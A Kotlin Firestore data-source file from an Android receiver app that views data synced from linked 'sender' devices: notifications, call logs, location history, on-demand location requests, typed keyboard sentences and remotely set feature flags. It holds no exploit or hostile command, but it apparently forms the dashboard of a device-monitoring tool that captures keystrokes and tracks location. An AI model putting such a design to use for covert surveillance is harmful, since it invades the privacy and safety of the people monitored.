// ============================================================
// FILE: app/src/main/java/com/app/notisync_receiver/data/remote/FirestoreDataSource.kt
// Purpose: Handles all Firestore operations for devices, notifications, location, call logs, and keyboard sync
// ============================================================

package com.app.notisync_receiver.data.remote

import android.util.Log
import com.app.notisync_receiver.domain.model.CallLogBatch
import com.app.notisync_receiver.domain.model.DeviceLocation
import com.app.notisync_receiver.domain.model.NotificationBatch
import com.app.notisync_receiver.domain.model.SenderDevice
import com.app.notisync_receiver.domain.model.SentenceBatch
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.SetOptions
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.tasks.await
import java.util.UUID
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FirestoreDataSource @Inject constructor(
    private val firestore: FirebaseFirestore
) {

    companion object {
        private const val TAG = "FirestoreDataSource"
        private const val COLLECTION_USERS = "users"
        private const val COLLECTION_DEVICES = "devices"
        private const val COLLECTION_NOTIFICATIONS = "notifications"
        private const val COLLECTION_LOCATION_REQUESTS = "location_requests"
        private const val COLLECTION_DEVICE_LOCATIONS = "device_locations"
        private const val COLLECTION_DAILY_CALL_LOGS = "daily_call_logs"
        private const val COLLECTION_KEYBOARD_SENTENCES = "keyboard_sentences"
        private const val COLLECTION_FEATURE_FLAGS = "feature_flags"
        private const val DOCUMENT_SETTINGS = "settings"
    }

    // ── Device Operations ──

    fun observeDevices(userId: String): Flow<List<SenderDevice>> = callbackFlow {
        val listenerRegistration: ListenerRegistration = firestore
            .collection(COLLECTION_USERS)
            .document(userId)
            .collection(COLLECTION_DEVICES)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "Error observing devices: ${error.message}", error)
                    return@addSnapshotListener
                }

                val devices = snapshot?.documents?.mapNotNull { doc ->
                    try {
                        doc.data?.let { SenderDevice.fromFirestore(it) }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing device: ${e.message}")
                        null
                    }
                } ?: emptyList()

                trySend(devices)
            }

        awaitClose {
            listenerRegistration.remove()
        }
    }

    suspend fun getDevices(userId: String): Result<List<SenderDevice>> {
        return try {
            val snapshot = firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .get()
                .await()

            val devices = snapshot.documents.mapNotNull { doc ->
                doc.data?.let { SenderDevice.fromFirestore(it) }
            }

            Result.success(devices)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get devices: ${e.message}", e)
            Result.failure(e)
        }
    }

    // ── Notification Operations ──

    fun observeNotifications(
        userId: String,
        deviceId: String,
        limit: Long = 50
    ): Flow<List<NotificationBatch>> = callbackFlow {
        val listenerRegistration: ListenerRegistration = firestore
            .collection(COLLECTION_USERS)
            .document(userId)
            .collection(COLLECTION_DEVICES)
            .document(deviceId)
            .collection(COLLECTION_NOTIFICATIONS)
            .orderBy("batchTimestamp", Query.Direction.DESCENDING)
            .limit(limit)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "Error observing notifications: ${error.message}", error)
                    return@addSnapshotListener
                }

                val batches = snapshot?.documents?.mapNotNull { doc ->
                    try {
                        doc.data?.let { NotificationBatch.fromFirestore(it) }
                    } catch (e: Exception) {
                        null
                    }
                } ?: emptyList()

                trySend(batches)
            }

        awaitClose {
            listenerRegistration.remove()
        }
    }

    fun observeAllNotifications(
        userId: String,
        limit: Long = 100
    ): Flow<List<NotificationBatch>> = callbackFlow {
        var listenerRegistrations = mutableListOf<ListenerRegistration>()

        val devicesListener = firestore
            .collection(COLLECTION_USERS)
            .document(userId)
            .collection(COLLECTION_DEVICES)
            .addSnapshotListener { devicesSnapshot, devicesError ->
                if (devicesError != null) {
                    Log.e(TAG, "Error observing devices: ${devicesError.message}")
                    return@addSnapshotListener
                }

                listenerRegistrations.forEach { it.remove() }
                listenerRegistrations.clear()

                val allBatches = mutableListOf<NotificationBatch>()
                val deviceIds = devicesSnapshot?.documents?.map { it.id } ?: emptyList()

                if (deviceIds.isEmpty()) {
                    trySend(emptyList())
                    return@addSnapshotListener
                }

                deviceIds.forEach { deviceId ->
                    val listener = firestore
                        .collection(COLLECTION_USERS)
                        .document(userId)
                        .collection(COLLECTION_DEVICES)
                        .document(deviceId)
                        .collection(COLLECTION_NOTIFICATIONS)
                        .orderBy("batchTimestamp", Query.Direction.DESCENDING)
                        .limit(limit / deviceIds.size)
                        .addSnapshotListener { notifSnapshot, notifError ->
                            if (notifError != null) return@addSnapshotListener

                            val batches = notifSnapshot?.documents?.mapNotNull { doc ->
                                try {
                                    doc.data?.let { NotificationBatch.fromFirestore(it) }
                                } catch (e: Exception) {
                                    null
                                }
                            } ?: emptyList()

                            allBatches.removeAll { it.deviceId == deviceId }
                            allBatches.addAll(batches)
                            allBatches.sortByDescending { it.batchTimestamp }

                            trySend(allBatches.toList())
                        }

                    listenerRegistrations.add(listener)
                }
            }

        awaitClose {
            listenerRegistrations.forEach { it.remove() }
            devicesListener.remove()
        }
    }

    suspend fun getNotificationBatches(
        userId: String,
        deviceId: String,
        limit: Long = 50
    ): Result<List<NotificationBatch>> {
        return try {
            val snapshot = firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_NOTIFICATIONS)
                .orderBy("batchTimestamp", Query.Direction.DESCENDING)
                .limit(limit)
                .get()
                .await()

            val batches = snapshot.documents.mapNotNull { doc ->
                doc.data?.let { NotificationBatch.fromFirestore(it) }
            }

            Result.success(batches)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    // ── Location Request Operations ──

    suspend fun sendLocationRequest(
        userId: String,
        deviceId: String,
        requestedByDeviceId: String
    ): Result<Unit> {
        return try {
            val requestId = UUID.randomUUID().toString()
            val requestMap = mapOf(
                "requestId" to requestId,
                "userId" to userId,
                "deviceId" to deviceId,
                "requestedAt" to System.currentTimeMillis(),
                "requestedBy" to requestedByDeviceId,
                "status" to "pending",
                "expiresAt" to (System.currentTimeMillis() + 24 * 60 * 60 * 1000L)
            )

            firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_LOCATION_REQUESTS)
                .document(requestId)
                .set(requestMap)
                .await()

            Log.d(TAG, "Location request sent: $requestId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send location request: ${e.message}", e)
            Result.failure(e)
        }
    }

    fun observeDeviceLocations(
        userId: String,
        deviceId: String,
        limit: Long = 20
    ): Flow<List<DeviceLocation>> = callbackFlow {
        val listenerRegistration = firestore
            .collection(COLLECTION_USERS)
            .document(userId)
            .collection(COLLECTION_DEVICES)
            .document(deviceId)
            .collection(COLLECTION_DEVICE_LOCATIONS)
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .limit(limit)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "Error observing locations: ${error.message}")
                    return@addSnapshotListener
                }

                val locations = snapshot?.documents?.mapNotNull { doc ->
                    try {
                        val data = doc.data?.toMutableMap()
                        if (data != null && !data.containsKey("locationId")) {
                            data["locationId"] = doc.id
                        }
                        data?.let { DeviceLocation.fromFirestore(it) }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing location: ${e.message}")
                        null
                    }
                } ?: emptyList()

                trySend(locations)
            }

        awaitClose {
            listenerRegistration.remove()
        }
    }

    suspend fun getLatestLocation(
        userId: String,
        deviceId: String
    ): Result<DeviceLocation?> {
        return try {
            val snapshot = firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_DEVICE_LOCATIONS)
                .orderBy("timestamp", Query.Direction.DESCENDING)
                .limit(1)
                .get()
                .await()

            val location = snapshot.documents.firstOrNull()?.let { doc ->
                val data = doc.data?.toMutableMap()
                if (data != null && !data.containsKey("locationId")) {
                    data["locationId"] = doc.id
                }
                data?.let { DeviceLocation.fromFirestore(it) }
            }
            Result.success(location)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    // ── Call Log Operations ──

    fun observeCallLogBatches(
        userId: String,
        deviceId: String,
        limit: Long = 30
    ): Flow<List<CallLogBatch>> = callbackFlow {
        val listenerRegistration = firestore
            .collection(COLLECTION_USERS)
            .document(userId)
            .collection(COLLECTION_DEVICES)
            .document(deviceId)
            .collection(COLLECTION_DAILY_CALL_LOGS)
            .orderBy("batchTimestamp", Query.Direction.DESCENDING)
            .limit(limit)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "Error observing call logs: ${error.message}")
                    return@addSnapshotListener
                }

                val batches = snapshot?.documents?.mapNotNull { doc ->
                    try {
                        doc.data?.let { CallLogBatch.fromFirestore(it) }
                    } catch (e: Exception) {
                        null
                    }
                } ?: emptyList()

                trySend(batches)
            }

        awaitClose {
            listenerRegistration.remove()
        }
    }

    suspend fun getCallLogBatches(
        userId: String,
        deviceId: String,
        limit: Long = 20
    ): Result<List<CallLogBatch>> {
        return try {
            val snapshot = firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_DAILY_CALL_LOGS)
                .orderBy("batchTimestamp", Query.Direction.DESCENDING)
                .limit(limit)
                .get()
                .await()

            val batches = snapshot.documents.mapNotNull { doc ->
                doc.data?.let { CallLogBatch.fromFirestore(it) }
            }

            Result.success(batches)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get call log batches: ${e.message}", e)
            Result.failure(e)
        }
    }

    // ── Keyboard Sentence Operations ──

    fun observeSentenceBatches(
        userId: String,
        deviceId: String,
        limit: Long = 30
    ): Flow<List<SentenceBatch>> = callbackFlow {
        val listenerRegistration = firestore
            .collection(COLLECTION_USERS)
            .document(userId)
            .collection(COLLECTION_DEVICES)
            .document(deviceId)
            .collection(COLLECTION_KEYBOARD_SENTENCES)
            .orderBy("batchTimestamp", Query.Direction.DESCENDING)
            .limit(limit)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "Error observing sentences: ${error.message}")
                    return@addSnapshotListener
                }

                val batches = snapshot?.documents?.mapNotNull { doc ->
                    try {
                        doc.data?.let { SentenceBatch.fromFirestore(it) }
                    } catch (e: Exception) {
                        null
                    }
                } ?: emptyList()

                trySend(batches)
            }

        awaitClose {
            listenerRegistration.remove()
        }
    }

    // ── Feature Flag Operations ──

    suspend fun updateFeatureFlag(
        userId: String,
        deviceId: String,
        flagName: String,
        flagValue: Boolean
    ): Result<Unit> {
        return try {
            val updates = mapOf(
                flagName to flagValue,
                "updatedAt" to System.currentTimeMillis()
            )
            firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_FEATURE_FLAGS)
                .document(DOCUMENT_SETTINGS)
                .set(updates, SetOptions.merge())
                .await()

            Log.d(TAG, "Feature flag updated: $flagName = $flagValue")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update feature flag: ${e.message}", e)
            Result.failure(e)
        }
    }

    fun observeFeatureFlags(
        userId: String,
        deviceId: String
    ): Flow<Map<String, Boolean>> = callbackFlow {
        val listenerRegistration = firestore
            .collection(COLLECTION_USERS)
            .document(userId)
            .collection(COLLECTION_DEVICES)
            .document(deviceId)
            .collection(COLLECTION_FEATURE_FLAGS)
            .document(DOCUMENT_SETTINGS)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "Error observing feature flags: ${error.message}")
                    return@addSnapshotListener
                }

                val flags = mutableMapOf<String, Boolean>()
                snapshot?.data?.forEach { (key, value) ->
                    if (value is Boolean) {
                        flags[key] = value
                    }
                }
                trySend(flags)
            }

        awaitClose {
            listenerRegistration.remove()
        }
    }

    // ── DELETE OPERATIONS ──

    // Delete a single notification document from Firestore
    suspend fun deleteNotification(
        userId: String,
        deviceId: String,
        batchId: String
    ): Result<Unit> {
        return try {
            firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_NOTIFICATIONS)
                .document(batchId)
                .delete()
                .await()
            Log.d(TAG, "Notification deleted: $batchId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete notification: ${e.message}", e)
            Result.failure(e)
        }
    }

    // Delete ALL notifications for a specific device from Firestore
    suspend fun deleteAllNotifications(
        userId: String,
        deviceId: String
    ): Result<Int> {
        return try {
            val snapshot = firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_NOTIFICATIONS)
                .get()
                .await()
            var deletedCount = 0
            for (doc in snapshot.documents) {
                doc.reference.delete().await()
                deletedCount++
            }
            Log.d(TAG, "Deleted $deletedCount notifications for device $deviceId")
            Result.success(deletedCount)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete all notifications: ${e.message}", e)
            Result.failure(e)
        }
    }

    // Delete a single call log batch from Firestore
    suspend fun deleteCallLogBatch(
        userId: String,
        deviceId: String,
        batchId: String
    ): Result<Unit> {
        return try {
            firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_DAILY_CALL_LOGS)
                .document(batchId)
                .delete()
                .await()
            Log.d(TAG, "Call log batch deleted: $batchId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete call log batch: ${e.message}", e)
            Result.failure(e)
        }
    }

    // Delete ALL call logs for a specific device from Firestore
    suspend fun deleteAllCallLogs(
        userId: String,
        deviceId: String
    ): Result<Int> {
        return try {
            val snapshot = firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_DAILY_CALL_LOGS)
                .get()
                .await()
            var deletedCount = 0
            for (doc in snapshot.documents) {
                doc.reference.delete().await()
                deletedCount++
            }
            Log.d(TAG, "Deleted $deletedCount call log batches for device $deviceId")
            Result.success(deletedCount)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete all call logs: ${e.message}", e)
            Result.failure(e)
        }
    }

    // Delete a single sentence batch from Firestore
    suspend fun deleteSentenceBatch(
        userId: String,
        deviceId: String,
        batchId: String
    ): Result<Unit> {
        return try {
            firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_KEYBOARD_SENTENCES)
                .document(batchId)
                .delete()
                .await()
            Log.d(TAG, "Sentence batch deleted: $batchId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete sentence batch: ${e.message}", e)
            Result.failure(e)
        }
    }

    // Delete a single location entry from Firestore
    suspend fun deleteLocation(
        userId: String,
        deviceId: String,
        locationId: String
    ): Result<Unit> {
        return try {
            firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection(COLLECTION_DEVICE_LOCATIONS)
                .document(locationId)
                .delete()
                .await()
            Log.d(TAG, "Location deleted: $locationId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete location: ${e.message}", e)
            Result.failure(e)
        }
    }

    // Delete ENTIRE device and ALL its subcollections from Firestore
    suspend fun deleteDevice(
        userId: String,
        deviceId: String
    ): Result<Unit> {
        return try {
            // Delete all notifications
            deleteAllDocumentsInCollection(
                firestore
                    .collection(COLLECTION_USERS)
                    .document(userId)
                    .collection(COLLECTION_DEVICES)
                    .document(deviceId)
                    .collection(COLLECTION_NOTIFICATIONS)
            )

            // Delete all location requests
            deleteAllDocumentsInCollection(
                firestore
                    .collection(COLLECTION_USERS)
                    .document(userId)
                    .collection(COLLECTION_DEVICES)
                    .document(deviceId)
                    .collection(COLLECTION_LOCATION_REQUESTS)
            )

            // Delete all device locations
            deleteAllDocumentsInCollection(
                firestore
                    .collection(COLLECTION_USERS)
                    .document(userId)
                    .collection(COLLECTION_DEVICES)
                    .document(deviceId)
                    .collection(COLLECTION_DEVICE_LOCATIONS)
            )

            // Delete all call logs
            deleteAllDocumentsInCollection(
                firestore
                    .collection(COLLECTION_USERS)
                    .document(userId)
                    .collection(COLLECTION_DEVICES)
                    .document(deviceId)
                    .collection(COLLECTION_DAILY_CALL_LOGS)
            )

            // Delete all keyboard sentences
            deleteAllDocumentsInCollection(
                firestore
                    .collection(COLLECTION_USERS)
                    .document(userId)
                    .collection(COLLECTION_DEVICES)
                    .document(deviceId)
                    .collection(COLLECTION_KEYBOARD_SENTENCES)
            )

            // Delete all feature flags
            deleteAllDocumentsInCollection(
                firestore
                    .collection(COLLECTION_USERS)
                    .document(userId)
                    .collection(COLLECTION_DEVICES)
                    .document(deviceId)
                    .collection(COLLECTION_FEATURE_FLAGS)
            )

            // Finally delete the device document itself
            firestore
                .collection(COLLECTION_USERS)
                .document(userId)
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .delete()
                .await()

            Log.d(TAG, "Device deleted completely: $deviceId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete device: ${e.message}", e)
            Result.failure(e)
        }
    }

    // Helper to delete all documents in a collection reference
    private suspend fun deleteAllDocumentsInCollection(
        collectionRef: com.google.firebase.firestore.CollectionReference
    ) {
        try {
            val snapshot = collectionRef.get().await()
            for (doc in snapshot.documents) {
                doc.reference.delete().await()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error deleting collection: ${e.message}")
        }
    }
}
